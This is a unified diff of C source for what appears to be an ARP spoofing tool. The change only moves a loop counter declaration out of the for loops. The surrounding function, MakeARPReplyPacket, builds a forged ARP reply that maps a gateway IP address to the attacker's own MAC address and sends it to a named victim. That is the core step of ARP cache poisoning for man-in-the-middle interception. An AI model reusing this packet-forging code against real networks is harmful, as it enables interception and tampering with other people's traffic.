@@ -41,11 +41,12 @@ int CheckIP(char* ipStr)
 
 void MakeARPReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* gatewayIP, BYTE* victimIP, BYTE* arpReplyPacket)
 {
+    int i = 0;
     int packetIdx = 0;
 
     // set ethernet header
-    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
-    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
+    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
+    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
     arpReplyPacket[packetIdx++] = 0x08; // type : ARP
     arpReplyPacket[packetIdx++] = 0x06;
 
@@ -58,10 +59,10 @@ void MakeARPReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* gatewayIP, BYTE* 
     arpReplyPacket[packetIdx++] = 0x04; // Protocol Size : 4
     arpReplyPacket[packetIdx++] = 0x00; // Opcode : Reply
     arpReplyPacket[packetIdx++] = 0x02;
-    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
-    for (int i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = gatewayIP[i];
-    for (int i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
-    for (int i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = victimIP[i];
+    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
+    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = gatewayIP[i];
+    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
+    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = victimIP[i];
 }
 
 int main(int argc, char** argv)
